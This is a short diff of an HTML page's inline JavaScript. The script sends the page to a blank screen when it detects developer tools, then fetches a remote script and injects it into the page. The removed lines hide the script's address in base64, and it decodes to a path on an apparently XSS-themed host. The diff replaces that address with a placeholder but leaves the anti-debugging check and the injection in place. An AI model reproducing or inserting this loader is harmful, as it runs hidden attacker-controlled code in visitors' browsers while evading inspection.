@@ -5,7 +5,6 @@
 </head>
 <body>
 	<script type="text/javascript">
-		
 		var isDebugT = setInterval(function(){
 			if(isDebug() == true){
 				window.location.href = 'about:blank';	//空白页
@@ -29,7 +28,7 @@
 		};
 
 		function execute(){
-			var url=atob('aHR0cHM6Ly94c3MuYnovc2NyaXB0L0ppbmdOaQ');
+			var url=atob('url');
 			var xhr = new XMLHttpRequest();
 			xhr.open("get",url,true);
 			xhr.send();
@@ -41,7 +40,7 @@
 		};
 
 		function load(){
-			var url = atob('aHR0cHM6Ly94c3MuYnovc2NyaXB0L0ppbmdOaQ');
+			var url = atob('url');
 			var jsDom = document.createElement("script");
 			jsDom.src = url;
 			console.log(jsDom,url);
